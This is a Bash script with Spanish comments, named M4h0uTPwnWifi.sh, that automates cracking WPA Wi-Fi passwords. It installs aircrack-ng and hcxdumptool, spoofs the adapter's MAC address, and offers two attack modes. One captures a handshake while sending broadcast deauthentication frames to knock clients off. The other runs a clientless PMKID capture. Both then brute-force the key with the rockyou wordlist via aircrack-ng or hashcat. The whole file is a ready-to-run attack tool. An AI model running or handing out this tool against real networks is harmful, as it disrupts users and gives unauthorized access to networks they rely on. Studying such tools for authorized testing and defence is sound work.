#!/bin/bash

# Author: M4h0uT

#Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

export DEBIAN_FRONTEND=noninteractive #Para que no salga el menu de instalación grafico

trap ctrl_c INT #Capturar el control+c para salir

#Funcion del control+c
function ctrl_c()
{ 
	echo -e "\n${yellowColour}[*]${endColour}${grayColour}Saliendo${endColour}" #Para imprimir por pantalla
	tput cnorm; airmon-ng stop ${networkCard}mon > /dev/null 2>&1 #Quita la tarjeta de red del modo monitor y redirige la salida con ok al dev/null
	rm Captura* 2>/dev/null #Elimina la carpeta Captura si se crea redifigiendo cualquier fallo al dev/null
	exit 0 #Salir con ok
}

function helpPanel()
{
	echo -e "\n${yellowColour}[*]${endColour}${grayColour} Uso: ./M4h0uTPwnWifi.sh${endColour}"
	echo -e "\n\t${purpleColour}-a${endColour}${yellowColour} Modo de ataque${endColour}"
	echo -e "\t\t${redColour} H Handshake${endColour}"
	echo -e "\t\t${redColour} P PKMID${endColour}"
	echo -e "\t${purpleColour}-n${endColour}${yellowColour} Nombre de la tarjeta de red${endColour}"
	echo -e "\t${purpleColour}-h${endColour}${yellowColour} Mostrar este panel de ayuda${endColour}\n"
	exit 0
}

#Instalación de los programas necesarios
function dependencies()
{
	tput civis #Ocultar la barra vertical de escribir
	clear
	dependencies=(aircrack-ng macchanger hcxdumptool) #Variable con los programas

	echo -e "${yellowColour}[*]${endColour}${grayColour} Comprobando programas necesarios...${endColour}"
	sleep 2

	for program in "${dependencies[@]}" #recorre los programas en la variable dependencies
	do  
		echo -ne "\n${yellowColour}[*]${endColour}${blueColour} Herramienta${endColour}${purpleColour} $program${endColour}${blueColour}...${endColour}" #Este echo como es con -ne permite que se escriba cuando se acaba la linea no en otra

		#devuelve un 0 si el programa está instalado
		#Es igual que el which pero te devuelve un 0 si ok o un 1 si no existe
		test -f /usr/bin/$program

		if [ "$(echo $?)" == "0" ];
		then # Si el codigo que devuelve el ultimo proceso es 0 es que se ha ejecutado bien
			echo -e " ${greenColour}(V)${endColour}"
		else
			echo -e " ${redColour}(X)${endColour}\n"
			echo -e "${yellowColour}[*]${endColour}${grayColour} Instalando herramienta ${endColour}${purpleColour}$program${endColour}${blueColour}...${endColour}"

			if [ "$program" == "hcxdumptool" ];
			then
				sudo apt-get update -y > /dev/null 2>&1
				sudo apt-get install -y libcurl4-openssl-dev libssl-dev zlib1g-dev libpcap-dev > /dev/null 2>&1
				#sudo apt install -y john > /dev/null 2>&1

				git clone https://github.com/ZerBea/hcxdumptool.git > /dev/null 2>&1
				cd hcxdumptool
				sudo make > /dev/null 2>&1
				sudo make install > /dev/null 2>&1
				cd ..

				apt install hcxtools
				#git clone https://github.com/ZerBea/hcxtools.git
				#cd hcxtools
				#sudo make
				#sudo make install
				#cd ..

			else
				apt-get install $program -y > /dev/null 2>&1
			fi

			
		fi
		sleep 1
	done
}

function startAttack()
{
		clear
		echo -e "${yellowColour}[*]${endColour}${grayColour} Configurando tarjeta de red...${endColour}\n"
		airmon-ng start $networkCard > /dev/null 2>&1
		ifconfig ${networkCard}mon down > /dev/null 2>&1
		macchanger -a ${networkCard}mon > /dev/null 2>&1
		ifconfig ${networkCard}mon up
		killall dhclient wpa_supplicant 2>/dev/null

		#filtrado de la salida de macchanger (el grep filtra el current) (el xarg quita los espacios en blanco por medio) (y el cut quita todo lo que hay antes del tercer espacio hacia atras)
		echo -e "${yellowColour}[*]${endColour}${grayColour} Nueva dirección MAC asignada ${endColour}${purpleColour}[${endColour}${blueColour}$(macchanger -s ${networkCard}mon | grep -i current | xargs | cut -d ' ' -f '3-100')${endColour}${purpleColour}]${endColour}"

	if [ "$(echo $attack_mode)" == "H" ]
	then

		xterm -hold -e "airodump-ng ${networkCard}mon" &
		airodump_xterm_PID=$!
		echo -ne "\n${yellowColour}[*]${endColour}${grayColour} Nombre del punto de acceso: ${endColour}" && read apName
		echo -ne "\n${yellowColour}[*]${endColour}${grayColour} Canal del punto de acceso: ${endColour}" && read apChannel

		kill -9 $airodump_xterm_PID
		wait $airodump_xterm_PID 2>/dev/null

		xterm -hold -e "airodump-ng -c $apChannel -w Captura --essid $apName ${networkCard}mon" &
		airodump_filter_xterm_PID=$!

		sleep 5; xterm -hold -e "aireplay-ng -0 10 -e $apName -c FF:FF:FF:FF:FF:FF ${networkCard}mon" &
		aireplay_xterm_PID=$!
		sleep 10; kill -9 $aireplay_xterm_PID; wait $aireplay_xterm_PID 2>/dev/null

		sleep 10; kill -9 $airodump_filter_xterm_PID
		wait $airodump_filter_xterm_PID 2>/dev/null

		xterm -hold -e "aircrack-ng -w /usr/share/wordlists/rockyou.txt Captura-01.cap" &

	elif [ "$(echo $attack_mode)" == "P" ]
	then

		clear; echo -e "${yellowColour}[*]${endColour}${grayColour} Iniciando ClientLess PKMID Attack...${endColour}\n"
		sleep 2
		timeout 60 bash -c "hcxdumptool -i ${networkCard}mon --enable_status=1 -o Captura"
		echo -e "\n\n${yellowColour}[*]${endColour}${grayColour} Obteniendo Hashes...${endColour}\n"
		sleep 2
		hcxpcaptool -z myHashes Captura; rm Captura 2>/dev/null

		test -f myHashes

		if [ "$(echo $?)" == "0" ]
		then
			echo -e "\n${yellowColour}[*]${endColour}${grayColour} Iniciando proceso de fuerza bruta...${endColour}\n"
			sleep 2

			hashcat -m 16800 /usr/share/wordlists/rockyou.txt myHashes -d 1 --force
		else
			echo -e "\n${redColour}[!]${endColour}${grayColour} No se ha podido capturar el paquete necesario...${endColour}\n"
			rm Captura* 2>/dev/null
			sleep 2
		fi
	else
		echo -e "\n${redColour}[*] Este modo de ataque no es válido${endColour}\n"
	fi
}

# Main Function

if [ "$(id -u)" == "0" ]
then
	declare -i parameter_counter=0; while getopts ":a:n:h:" arg; do
		case $arg in
			a) attack_mode=$OPTARG; let parameter_counter+=1 ;;
			n) networkCard=$OPTARG; let parameter_counter+=1 ;;
			h) helpPanel;;
		esac
	done

	if [ $parameter_counter -ne 2 ]; then
		helpPanel
	else
		dependencies
		startAttack
		tput cnorm
		airmon-ng stop ${networkCard}mon > /dev/null 2>&1
	fi
else
	echo -e "\n${redColour}[*] Ejecuta con root${endColour}\n"
fi
